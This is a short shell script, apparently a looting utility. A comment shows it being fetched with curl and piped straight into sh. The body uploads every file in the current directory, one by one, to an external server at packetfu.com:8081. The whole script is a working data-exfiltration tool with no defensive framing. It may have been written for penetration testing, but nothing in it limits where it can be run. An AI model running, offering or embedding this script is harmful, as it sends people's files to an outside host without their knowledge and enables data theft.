#!/bin/sh
# Usage: curl -kSL http://r-7.co/curl-loot | sh
for i in *; do sleep 3; curl -F filename="$i" -F filedata=@$i http://packetfu.com:8081/upload; done
